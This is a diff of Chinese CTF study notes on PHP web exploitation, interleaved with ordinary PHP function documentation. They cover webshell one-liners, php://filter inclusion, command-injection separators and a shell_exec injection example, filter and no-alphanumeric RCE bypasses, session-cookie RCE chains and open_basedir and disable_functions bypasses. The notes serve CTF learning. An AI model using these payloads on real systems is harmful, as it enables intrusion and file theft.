@@ -1,6 +1,3 @@
----
-这是什么
----
 
 
 
@@ -15,8 +12,7 @@
 
 
 
-
-##一句话木马
+#一句话木马
 
 ```nginx
 # script标签要求php版本在7.0以下
@@ -38,7 +34,7 @@ urlencode(~'assert');
 urlencode(~'(eval($_POST[mochu]))')
 ```
 
-## http协议
+# http协议
 
 **请求头**
 
@@ -68,7 +64,7 @@ Via: Clash.win			设置代理
 
 
 
-## php特性利用
+# php特性利用
 
 -   **php在解析字符串时会把点和空格解析成 `_`** 
 -   **常见的可执行文件的后缀**
@@ -98,7 +94,7 @@ Via: Clash.win			设置代理
 
     
 
-### php7特性-变量执行函数
+## php7特性-变量执行函数
 
 > 
 >
@@ -115,9 +111,38 @@ Via: Clash.win			设置代理
 > $a();
 > ```
 >
+
+## php 动态调用成员属性和方法
+
+> ```nginx
+> class Demo{
+>     public $method;
+> 
+>     public function setMethod(){
+>         $this->method = 'action';
+>         return $this;
+>     }
+> 
+>     public function action(){
+>         echo 'here';
+>     }
+> 
+>     public function stat(){
+>         // 使用大括号
+>         $this->{$this->method}();
+>     }
+> }
+> 
+> $obj = new Demo();
+> 
+> $obj->setMethod()->stat();
+> ```
+>
 > 
 
-### 双美元符：`$$`
+
+
+## 双美元符：`$$`
 
 ```nginx
 双美元符号：`$$`
@@ -132,7 +157,7 @@ echo $value; # 输出 200
 利用点：间接修改或获取目标参数的值
 ```
 
-### 内置属性：`$_SERVER`
+## 内置属性：`$_SERVER`
 
 **介绍及案例**
 
@@ -157,7 +182,7 @@ $_SERVER["REMOTE_ADDR"] => "127.0.0.1"，
 $_SERVER['QUERY_STRING']	不会进行urldecode，$_GET[]会
 ```
 
-### 内置属性：$_REQUEST
+## 内置属性：$_REQUEST
 
 **介绍**
 
@@ -174,9 +199,9 @@ $_SERVER['QUERY_STRING']	不会进行urldecode，$_GET[]会
 
 
 
-### 伪协议
+## 伪协议
 
-#### php://filter文件包含
+### php://filter文件包含
 
 > 这是一种访问本地文件的协议
 >
@@ -252,7 +277,7 @@ $_SERVER['QUERY_STRING']	不会进行urldecode，$_GET[]会
     php://filter//NewStar/read=convert.quoted-printable-encode/resource=flag.php
     ```
 
-##### 其他类型利用
+#### 其他类型利用
 
 ```nginx
  if ( substr($_GET["file"], 0, 3) === "php" ) {
@@ -270,7 +295,7 @@ php://filter/read=convert.base64-encode/resource=flag.php
 
 
 
-### php://input
+## php://input
 
 > php://input，**需要allow_url_include=On**
 >
@@ -290,7 +315,7 @@ I have a dream
 
 
 
-### phpinfo
+## phpinfo
 
 > -  [session.upload_progress](https://www.php.net/manual/zh/session.upload-progress.php) 功能
 > - https://blog.csdn.net/qq_46266259/article/details/128867195
@@ -310,13 +335,13 @@ I have a dream
 
 
 
-****
-
-## php函数及绕过
 
 
+# php函数及绕过
 
-#### eval()
+
+
+## eval()
 
 -   **—把字符串作为PHP代码执行**
 
@@ -347,7 +372,7 @@ $code = eval(\$_POST[1]);
 1=system('ls');
 ```
 
-##### 黑白名单过滤
+### 黑白名单过滤
 
 ```nginx
 # 执行命令的地方
@@ -380,7 +405,7 @@ c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2}
 
 
 
-#### shell_exec()
+## shell_exec()
 
 -   **通过shell环境执行命令,并且将完整的输出以字符串的方式返回**
 
@@ -396,9 +421,24 @@ c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2}
 	<绕过，cat</f*
 ```
 
+```nginx
+# 案例
+$action = $_POST["action"];
+# 命令是拼接的，闭合引号再执行自己的命令
+$data = "'".$_POST["data"]."'";
+
+$output = shell_exec("/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar $action $data");
+echo $output; 
+
+# 【&】符号的作用是：后台执行、连接执行命令
+# 或者还可以使用【|】管道符连接命令
+# action=1&data='&whoami'
+
+```
 
 
-#### file_get_contents()
+
+## file_get_contents()
 
 -   **将整个文件读入一个字符串**
 
@@ -414,7 +454,7 @@ c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2}
 
 ​    
 
-#### sha1()
+## sha1()
 
 -   **计算字符串的 sha1 散列值**
 
@@ -431,17 +471,20 @@ sha1()函数无法处理数组，$shana和$passwd都是数组时，都是false
 
 ****
 
-#### md5
+## md5
 
-**md5强碰撞**
+### **md5强碰撞**
 
 > **两个值 == 比较不相等，md5加密 ===  要相等**
 >
 > 提供两个值
 >
 > ```nginx
-> a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
-> &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+> %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+> %4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+> 
+> M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+> M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
 > ```
 
 ```nginx
@@ -468,7 +511,7 @@ if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
 wqh[]=123&dsy[]=456
 ```
 
-**弱类型**
+### **弱类型**
 
 > **找到一个数字，没加密和加密后相等，搭配php特性，也就是加密前面都是0e开头**
 >
@@ -496,27 +539,66 @@ wqh[]=123&dsy[]=456
 	所以我们先看看md5('QNKCDZO')的结果是0e830400451993494058024219903391，
 	那么所有0e开头的md5串都可以满足上面的条件。
 常用的有：
-	 QNKCDZO
-   0e830400451993494058024219903391
+   QNKCDZO
+   	md5值：0e830400451993494058024219903391
    240610708
-   0e462097431906509019562988736854
+   	md5值：0e462097431906509019562988736854
+
    s878926199a
-   0e545993274517709034328855841020
+   	md5值：0e545993274517709034328855841020
    s155964671a
-   0e342768416822451524974117254469
+   	md5值：0e342768416822451524974117254469
+
    s214587387a
-   0e848240448830537924465865611904
-	 s1502113478a
-   0e861580163291561247404381396064
+   	md5值：0e848240448830537924465865611904
+   s1502113478a
+   	md5值：0e861580163291561247404381396064
    s1885207154a
-   0e509367213418206700842008763514
+   	md5值：0e509367213418206700842008763514
 */
 
 ```
 
+## str_replace
 
+> 字符串替换函数
+>
+> - 接收四个参数
+>     - array|string `$search`：**查找的目标值**
+>     - array|string `$replace`：`search` 的替换值
+>     -  string|array `$subject`：**执行替换的数组或者字符串**
+>     - int `&$count` = **`null`**：设置替换次数
+>
+> ```nginx
+> <?php
+>   // 替换字符串<body text='black'> 中%body%为black
+>   $bodytag = str_replace("%body%", "black", "<body text='%body%'>");
+> 	# 结果：<body text='black'>
+> 
+>   // 将字符串 "Hello World of PHP" 中的元音字母（包括大小写）从字符串中删除
+>   $vowels = array("a", "e", "i", "o", "u", "A", "E", "I", "O", "U");
+>   $onlyconsonants = str_replace($vowels, "", "Hello World of PHP");
+> 	# 结果：Hll Wrld f PHP
+> 
+> 
+>   $phrase  = "You should eat fruits, vegetables, and fiber every day.";
+>   $healthy = array("fruits", "vegetables", "fiber");
+>   $yummy   = array("pizza", "beer", "ice cream");
+> 	
+> 	// 将字符串 $phrase 中的值以 $healthy 中的元素为标准
+> 	// 一一替换为数组 $yummy 中对应位置的元素
+>   $newphrase = str_replace($healthy, $yummy, $phrase);
+> 	# 结果：You should eat pizza, beer, and ice cream every day.
+> 
+>   // 将出现的结果替换两次
+>   $str = str_replace("ll", "", "good golly miss molly!", $count);
+>   echo $count;
+> ?>
+> ```
+>
+> 
 
-#### preg_match()
+## preg_match()
 
 -   **执行匹配正则表达式,**
 
@@ -560,9 +642,19 @@ wqh[]=123&dsy[]=456
 	preg_match('/^dsf$/') 可以加上换行符%0a截断绕过(ds%0af)，因为这个正则是需要固定出现
 ```
 
-#### preg_replace
+## preg_replace
 
 > 搜索指定字符串并替换
+
+```nginx
+# 单次正在匹配
+$str = preg_replace('/NSSCTF/',"",$_GET['str']);
+
+# 使用双写绕过
+NSSNSSCTFCTF
+```
+
+
 
 ```nginx
 # 绕过方式
@@ -586,7 +678,7 @@ wqh[]=123&dsy[]=456
   }
 ```
 
-##### **preg_replace** **/e**
+### **preg_replace** **/e**
 
 > [详细看](https://xz.aliyun.com/t/2557)
 
@@ -644,7 +736,7 @@ var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'
 
 
 
-#### basename()
+## basename()
 
 -   **返回路径中的文件名部分**
 
@@ -680,7 +772,7 @@ var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'
 
 ****
 
-#### create_function
+## create_function
 
 -   **通过执行代码字符串创建动态函数**
 
@@ -726,7 +818,7 @@ var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'
 
 ****
 
-#### call_user_func
+## call_user_func
 
 > 作用：回调函数
 >
@@ -761,7 +853,7 @@ call_user_func([$greeting, 'sayHello'], 'John');
 
 
 
-#### 随机数
+## 随机数
 
 -   **mt_srand()：给随机数发生器播种**
 -   **mt_rand()：生成随机数**
@@ -777,7 +869,7 @@ mt_rand()产生随机数时，如果用srand(seed)播下种子之后，一旦种
 	第一个就是，然后在PHP环境中测试输出种子的下一个随机数
 ```
 
-#### is_numeric()
+## is_numeric()
 
 -   **检测变量是否为数字或数字字符串**
 
@@ -790,7 +882,7 @@ mt_rand()产生随机数时，如果用srand(seed)播下种子之后，一旦种
 将'1 or 1'转换为16进制形式，再传参，就可以造成sql注入
 ```
 
-#### addslashes()
+## addslashes()
 
 -   **在特殊字符前添加\ **
 
@@ -804,7 +896,7 @@ mt_rand()产生随机数时，如果用srand(seed)播下种子之后，一旦种
 
 ```
 
-#### strcmp()
+## strcmp()
 
 ```nginx
 # 绕过
@@ -813,7 +905,7 @@ mt_rand()产生随机数时，如果用srand(seed)播下种子之后，一旦种
 
 
 
-#### putenv()
+## putenv()
 
 -   **设置环境变量的值(只能用绝对路径来调用系统命令)**
 
@@ -828,7 +920,7 @@ Linux命令的位置：
 /sbin,/usr/sbin,默认root用户使用
 ```
 
-#### exif_imagetype()
+## exif_imagetype()
 
 -   **判断一个图像的类型，常用与文件上传**
 
@@ -845,7 +937,9 @@ PNG： 89 50 4E 47
 # “\x00\x00\x8a\x39\x8a\x39”
 ```
 
-####     include
+##     include
+
+**不管包含什么类型的文件，都会作为php文件进行解析，require函数也是一样的**
 
 > 练手：https://www.nssctf.cn/problem/2640
 
@@ -853,7 +947,7 @@ PNG： 89 50 4E 47
 php://filter/read=convert.base64-encode/resource=flag
 ```
 
-#### intval
+## intval
 
 > 作用：**获取变量的整数值**
 >
@@ -870,7 +964,7 @@ php://filter/read=convert.base64-encode/resource=flag
 >   }else{
 >     die("金钱解决不了穷人的本质问题");
 >   }
->         
+>                                 
 >   # 当我们传入的是1e4的时候，
 >   # 经过intval函数的作用后就会变成1
 >   # 但是当加上1的时候就会变为10001。
@@ -901,13 +995,519 @@ php://filter/read=convert.base64-encode/resource=flag
 >
 > 
 
-## 常见漏洞
+## strlen
+
+```nginx
+if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){}
+
+# 绕过方法
+使用科学计数法：9e9
+```
 
 
 
-### 命令执行
 
-#### **文件读取命令替代**
+
+# 其他函数
+
+## [each](https://www.php.net/manual/zh/function.each)
+
+> **返回数组中当前的键或值对，并将数组指针向前移动一步**
+>
+> 自 PHP 7.2.0 起被*废弃*，并自 PHP 8.0.0 起被*移除*。 强烈建议不要依赖本函数。
+>
+> ```nginx
+> <?php
+>     $foo = array("bob", "fred", "jussi", "jouni", "egon", "marliese");
+>     $bar = each($foo);
+>     print_r($bar);
+> ?>
+> 
+> # 输出
+> Array
+> (
+>     [1] => bob
+>     [value] => bob
+>     [0] => 0
+>     [key] => 0
+> )
+> ```
+>
+> 
+
+
+
+## [spl_autoload_extensions](https://www.php.net/manual/zh/function.spl-autoload-extensions)
+
+> 注册并返回 spl_autoload 的默认文件扩展名
+>
+> ```nginx
+> <?php
+> 	# 一般返回	.php,.inc
+> 	spl_autoload_extensions(".php,.inc");
+> 
+> 	# 得到.inc,.php的单个字符串数组
+> 	str_split(spl_autoload_extensions())
+> 
+> 	# 得到0 => 0,1 => .，下标为1时得到符号【.】
+> 	each(str_split(spl_autoload_extensions()))
+> 	
+> 	# 得到符号【.】
+> 	next(each(str_split(spl_autoload_extensions())))
+> 	
+> 	# 得到当前目录下的数组li
+> 	scandir(next(each(str_split(spl_autoload_extensions()))))
+> ?>
+> ```
+>
+> 
+
+## current
+
+> 用于返回数组中当前指针所指向的元素的值
+
+## [str_split](https://www.php.net/manual/zh/function.str-split)
+
+>  将字符串转换为数组
+>
+> ```nginx
+> <?php
+> 	str_split(spl_autoload_extensions())
+> 
+> 	# 输出
+> 	array (
+>           0 => '.',
+>           1 => 'i',
+>           2 => 'n',
+>           3 => 'c',
+>           4 => ',',
+>           5 => '.',
+>           6 => 'p',
+>           7 => 'h',
+>           8 => 'p',
+>     )
+> 
+> ?>
+> ```
+>
+> 
+
+## [strrev](https://www.php.net/manual/zh/function.strrev.php)
+
+> - **反转字符串**
+> - **strrev(string `$string`): string**
+>
+> ```nginx
+> <?php
+> 	echo strrev("Hello world!"); # 输出 "!dlrow olleH"
+> 	echo strrev(strrev("Hello world!")); # 输出 "Hello world!"
+> ?>
+> ```
+>
+> 
+
+## [array_merge](https://www.php.net/manual/zh/function.array-merge)
+
+>  合并一个或多个数组，如果有相同的键存在，后面的数组将会覆盖前面的数组
+>
+> ```nginx
+> <?php
+>   $array1 = array("color" => "red", 2, 4);
+>   $array2 = array("a", "b", "color" => "green", "shape" => "trapezoid", 4);
+>   $result = array_merge($array1, $array2);
+>   print_r($result);
+> ?>
+> 
+> # 结果
+> Array
+> (
+>     [color] => green
+>     [0] => 2
+>     [1] => 4
+>     [2] => a
+>     [3] => b
+>     [shape] => trapezoid
+>     [4] => 4
+> )
+> ```
+>
+
+##[array_reverse](https://www.php.net/manual/zh/function.array-reverse)
+
+> **array_reverse()** 接受数组 `array` 作为输入并返回一个单元为相反顺序的新数组
+>
+> - `array_reverse(array `$array`, bool `$preserve_keys` = **`false`**): array`
+>     - **array**
+>         - 输入的数组
+>     - **preserve_keys**（受版本影响，默认保留键名）
+>         - 如果设置为 **`true`** 会保留原始数组名，并生成新的数组名返回
+>         - 设置为`false`不会保留数组名
+>
+> 
+>
+> ```nginx
+> <?php
+>     $input  = array("php", 4.0, array("green", "red"));
+>     $reversed = array_reverse($input);
+>     $preserved = array_reverse($input, true);
+> 
+>     print_r($input);
+>     print_r($reversed);
+>     print_r($preserved);
+> ?>
+> 
+> # 输出
+> # $input
+> Array
+> (
+>     [0] => php
+>     [1] => 4
+>     [2] => Array
+>         (
+>             [0] => green
+>             [1] => red
+>         )
+> )
+> # $reversed
+> Array
+> (
+>     [0] => Array
+>         (
+>             [0] => green
+>             [1] => red
+>         )
+> 
+>     [1] => 4
+>     [2] => php
+> )
+> # $preserved
+> Array
+> (
+>     [2] => Array
+>         (
+>             [0] => green
+>             [1] => red
+>         )
+> 
+>     [1] => 4
+>     [0] => php
+> )
+> ```
+>
+> 
+
+
+
+## [extract()](https://www.php.net/manual/zh/function.extract)
+
+>  从数组中将变量导入到当前的符号表
+>
+> 检查每个键名看是否可以作为一个合法的变量名，同时也检查是否和已有的变量名的冲突
+>
+> - 函数接收三个参数：
+>     - **array**：目标数组
+>     - **flags**：设置处理变量的方式，默认：**`EXTR_OVERWRITE`**
+>         - **`EXTR_OVERWRITE`**：如果有冲突，**覆盖已有的变量**
+>         - **`EXTR_SKIP`**：如果有冲突，**不覆盖已有的变量**。
+>         - **`EXTR_PREFIX_SAME`**：如有冲突，**添加前缀**
+>         - **`EXTR_PREFIX_ALL`**：**给所有变量名添加前缀**，不管是否冲突
+>         - **`EXTR_PREFIX_INVALID`**：**仅非法的变量名添加前缀**
+>         - **`EXTR_IF_EXISTS`**：**变量名已经存在，覆盖他们的值**
+>         - **`EXTR_PREFIX_IF_EXISTS`**：**当前上下文中存在同名变量，建立前缀**，其他不管
+>         - **`EXTR_REFS`**：**提取的变量将成为对原始数组元素的引用，表示所有操作都在原数组**
+>     - **prefix**：给变量添加前缀，当flags参数的值为以下值的时候可以配置前缀
+>         -  **`EXTR_PREFIX_SAME`**，
+>         - **`EXTR_PREFIX_ALL`**，
+>         - `EXTR_PREFIX_INVALID`
+>         - `EXTR_PREFIX_IF_EXISTS`
+>
+> ```nginx
+> <?php
+> 
+> /* 假定 $var_array 是 wddx_deserialize 返回的数组*/
+> 
+> $size = "large";
+> $var_array = array("color" => "blue",
+>                    "size"  => "medium",
+>                    "shape" => "sphere");
+> 
+> // 这里因为设置了EXTR_PREFIX_SAME，然后有两个size，后面一个size被重命名为了wddx_size
+> // wddx为我们指定的前缀
+> extract($var_array, EXTR_PREFIX_SAME, "wddx");
+> 
+> echo "$color, $size, $shape, $wddx_size\n";
+> # 输出：blue, large, sphere, medium
+> ?>
+> ```
+>
+> 
+
+## trim
+
+> *去除字符串首尾处的空白字符*
+
+## [explode](https://www.php.net/manual/zh/function.explode)
+
+> 使用一个字符串分割另一个字符串，
+>
+> ```nginx
+>   $params = explode(' ', $_params);
+> 
+> # 代码中以空格为分割，将$_params属性分割成一个数组$params[]，
+> # 比如说原来$_params="zhi shi xue bao"，
+> # 经过explode函数处理后变为$params=["zhi","shi","xue","bao"]
+> ```
+>
+> 
+
+## [substr](https://www.php.net/manual/zh/function.substr)
+
+> 字符串截取
+>
+> - 接收三个参数
+>     - string `$string`：输入字符串
+>     - int `$offset`：截取字符串开始的位置，**可以为负数**，负数从末尾开始
+>     - ?int `$length`：截取的长度，**也可以为负数**
+
+> ```nginx
+> <?php
+> echo substr('abcdef', 1);     // bcdef
+> echo substr("abcdef", 1, null); // bcdef; 在 PHP 8.0.0 之前，返回空字符串
+> echo substr('abcdef', 1, 3);  // bcd
+> echo substr('abcdef', 0, 4);  // abcd
+> echo substr('abcdef', 0, 8);  // abcdef
+> echo substr('abcdef', -1, 1); // f
+> 
+> // 访问字符串中的单个字符
+> // 也可以使用中括号
+> $string = 'abcdef';
+> echo $string[0];                 // a
+> echo $string[3];                 // d
+> echo $string[strlen($string)-1]; // f
+> ?>
+> ```
+
+## strpos
+
+> 查找字符串首次出现的位置
+
+
+
+## function_exists
+
+> 如果给定的函数已经被定义就返回 **`TRUE`**
+
+
+
+## [call_user_func_array](https://www.php.net/manual/zh/function.call-user-func-array)
+
+> 调用回调函数，并把一个数组参数作为回调函数的参数
+>
+> - 接收两个参数
+>     - [callable](https://www.php.net/manual/zh/language.types.callable.php) `$callback`：被调用的回调函数
+>     - array `$args`：要被传入回调函数的数组
+
+**正常使用**
+
+```nginx
+<?php
+    function foobar($arg, $arg2) {
+        echo __FUNCTION__, " got $arg and $arg2\n";
+    }
+    class foo {
+        function bar($arg, $arg2) {
+            echo __METHOD__, " got $arg and $arg2\n";
+        }
+    }
+
+
+    // 传入需要调用的函数名和参数，并输出 foobar got one and two
+    call_user_func_array("foobar", array("one", "two"));
+
+    // 创建foo的实例，并调用实例中的bar方法，然后将参数传入
+		// 并输出 foo::bar got three and four
+    $foo = new foo;
+    call_user_func_array(array($foo, "bar"), array("three", "four"));
+?>
+```
+
+**命名空间的情况**
+
+```nginx
+<?php
+
+namespace Foobar;
+
+class Foo {
+    static public function test($name) {
+        print "Hello {$name}!\n";
+    }
+}
+
+call_user_func_array(__NAMESPACE__ .'\Foo::test', array('Hannes'));
+
+call_user_func_array(array(__NAMESPACE__ .'\Foo', 'test'), array('Philip'));
+
+?>
+```
+
+**完整的函数作为回调传入**
+
+```nginx
+<?php
+
+$func = function($arg1, $arg2) {
+    return $arg1 * $arg2;
+};
+
+var_dump(call_user_func_array($func, array(2, 4))); // 输出：int(8)
+
+?>
+```
+
+**地址引用**
+
+```nginx
+<?php
+
+function mega(&$a){
+    $a = 55;
+    echo "function mega \$a=$a\n";
+}
+$bar = 77;
+call_user_func_array('mega',array(&$bar));
+echo "global \$bar=$bar\n";
+
+# 输出，因为是地址引用，修改了&a的值就等于修改了$bar的值
+function mega $a=55
+global $bar=55
+
+
+```
+
+
+
+## [call_user_func](https://www.php.net/manual/zh/function.call-user-func)
+
+> 把第一个参数作为回调函数调用
+>
+> - 接收两个参数
+>     - [callable](https://www.php.net/manual/zh/language.types.callable.php) `$callback`：回调函数名
+>     - [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) `...$args`：参数值，可以是多个
+
+**普通用法**
+
+```nginx
+# 普通用法
+<?php
+function barber($type)
+{
+    echo "You wanted a $type haircut, no problem\n";
+}
+call_user_func('barber', "mushroom");
+call_user_func('barber', "shave");
+?>
+
+# 调用一个类里面的方法
+```
+
+**命名空间用法**
+
+```nginx
+<?php
+# 命名空间的使用
+namespace Foobar;
+
+class Foo {
+    static public function test() {
+        print "Hello world!\n";
+    }
+}
+
+call_user_func(__NAMESPACE__ .'\Foo::test');
+call_user_func(array(__NAMESPACE__ .'\Foo', 'test'));
+# 结果
+Hello world!
+Hello world!
+?>
+```
+
+**调用一个类里面的方法**
+
+```nginx
+<?php
+
+    class myclass {
+        static function say_hello()
+        {
+            echo "Hello!\n";
+        }
+    }
+
+    $classname = "myclass";
+
+    call_user_func(array($classname, 'say_hello'));
+    call_user_func($classname .'::say_hello');
+
+    $myobject = new myclass();
+
+    call_user_func(array($myobject, 'say_hello'));
+	# 以上调用方法都可以执行say_hello函数
+?>
+```
+
+**完整函数作为回调**
+
+```nginx
+<?php
+call_user_func(function($arg) { print "[$arg]\n"; }, 'test');
+?>
+# 输出：[test]
+```
+
+
+
+# 常见漏洞
+
+
+
+## 命令执行
+
+### 常用命令
+
+| 命令的目的 | Linux       | Windows       |
+| ---------- | ----------- | ------------- |
+| 当前用户   | whoami      | whoami        |
+| 操作系统   | uname -a    | ver           |
+| 网络配置   | ifconfig    | ipconfig /all |
+| 网络连接   | netstat -an | netstat -an   |
+| 运行进程   | ps -ef      | tasklist      |
+
+
+
+```nginx
+1、以下命令分隔符在基于Windows和基于Unix的系统上都有效：
+    &
+    &&
+    |
+    ||
+ 
+2、以下命令分隔符仅适用于基于Unix的系统：
+    ;
+    换行符（0x0a或\n）
+ 
+3、在基于Unix的系统上，还可以使用反勾号或美元字符在原始命令中执行插入命令的内联执行：
+    '
+    注入命令'
+    $(插入命令)
+
+ 	    	       
+
+```
+
+
+
+### **文件读取命令替代**
 
 ```nginx
 # 读取文件命令
@@ -922,7 +1522,7 @@ od				# 以字节或其他格式显示文件内容，可以是二、八、十六
 hexdump		# 以十六进制和ASCII码形式显示文件内容，如：hexdump -C filename.txt
 ```
 
-#### **一些过滤代替**
+### **一些过滤代替**
 
 ```nginx
 过滤掉【空格】可使用：【+】 代替，如：cat+/flag
@@ -956,7 +1556,9 @@ system()函数
 >
 >   第二个参数与exec第三个参数含义一样
 
-####  **RCE 函数介绍**
+##  **RCE **
+
+**函数介绍**
 
 ```nginx
 <?php system('cat /f*');?>
@@ -968,7 +1570,7 @@ shell_exec();		# 默认无回显，通过 echo 可将执行结果输出到页面
 file_get_contents('waf.php');
 ```
 
-#### cookie：rce（一）
+### cookie：rce（一）
 
 ```nginx
 <?php
@@ -996,7 +1598,7 @@ if (isset($name))
 Cookie: PHPSESSID=cat${IFS}/f*
 name=hahaha&qaq=system(session_id(session_start()))
 ```
-#### cookie：rce（二）
+### cookie：rce（二）
 
 > 原题目为：云演陕西杯：**[SSCTF2023/ezrce](https://www.yunyansec.com/#/experiment/expdetail/6)**
 
@@ -1041,9 +1643,115 @@ name=hahaha1&qaq=show_source(session_id(session_start()));
 Cookie PHPSESSID=/flag
 ```
 
-#### 无字符rce
+### cookie：rce（三）
 
-**自增**
+> 其中关键是：`localeconv()`函数（==进行测试需要使用`print_r()`进行打印输出==）
+>
+> - 它的数组返回值中，**第一个输出当前系统的小数点符号**，
+>
+>     - ```nginx
+>         $localeInfo = localeconv();
+>         echo $localeInfo['decimal_point'];     // 输出当前系统的小数点符号
+>         ```
+>
+> - **搭配`current()`函数就可以表示当前上下文**
+>
+> - ==再搭配`scandir()`函数就可以获取当前目录下的文件列表数组==
+>
+> - **搭配`array_reverse()`函数可以选择要数组**
+>
+> - **搭配`highlight_file()、show_source()就可以显示文件内容`**
+
+```nginx
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+#  传入参数
+	#	通过将想要读取的文件名字放入cookie中，然后再去读取
+?exp=show_source(session_id(session_start()));
+PHPSESSID=flag.php
+
+?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
+show_source(next(array_reverse(scandir(
+next(each(str_split(spl_autoload_extensions())))))));
+```
+
+
+
+### bypass RCE
+
+#### (一)
+
+```nginx
+<?php
+
+$rce = $_GET['rce'];
+
+if (isset($rce)) {
+    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
+        system($rce);
+        # system(ls); === flag.php index.php
+    }else {
+        echo "hhhhhhacker!!!"."\n";
+    }
+} 
+
+?rce=ca\t${IFS}fl\ag.php
+```
+
+### require_once绕过
+
+
+
+
+
+
+
+### 无字符rce
+
+**一些函数**
+
+```nginx
+localeconv() 	– 函数返回一个包含本地数字及货币格式信息的数组 第一个是.
+pos() 			– 返回数组中的当前单元, 默认取第一个值
+next 			– 将内部指针指向数组下一个元素并输出
+scandir() 		– 扫描目录
+array_reverse() – 翻转数组
+array_flip() 	- 键名与数组值对调
+readfile()
+array_rand() 	- 随机读取键名
+var_dump() 		- 输出数组，可以用print_r替代
+file_get_contents() - 读取文件内容，show_source,highlight_file echo 可代替
+get_defined_vars() 	-  返回由所有已定义变量所组成的数组
+end() 				- 读取数组最后一个元素
+current() 			- 读取数组的第一个元素
+#php内置函数
+```
+
+
+
+#### **自增**
 
 > **以下代码相等于：`eval(@_POST[_]);`**
 
@@ -1058,7 +1766,7 @@ _=file_put_contents('1.php',"<?php print_r(ini_get('open_basedir').'<br>'); mkdi
 
 ```
 
-##### open_basedir绕过脚本
+#### open_basedir绕过脚本
 
 ==将代码写成一行的字符串时，注意将`$`进行转义==
 
@@ -1148,7 +1856,7 @@ show_source(__FILE__);
 
 
 
-##### **动态执行**
+#### **动态执行**
 
 ```nginx
 <?php
@@ -1165,7 +1873,7 @@ mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
 &_=phpinfo();
 ```
 
-##### **取反**
+#### **取反**
 
 ```nginx
 然后通过以下进行取反输出：
@@ -1175,7 +1883,7 @@ mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
     (~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)
 ```
 
-##### **异或**
+#### **异或**
 
 > **异或构造方式**：
 > 	使用异或，在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。
@@ -1185,11 +1893,239 @@ mess=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
 
 ```
 
+### disable_function绕过
+
+使用到了类，可尝试一下==php7（php7.0-7.3）==中的因为垃圾回收机制(GC)造成的UAF漏洞
+
+- > use after free,其内容如同其名称。在free后进行利用。UAF是堆结构漏洞的一种重要的利用方式
+
+    > - 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
+    > - 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。
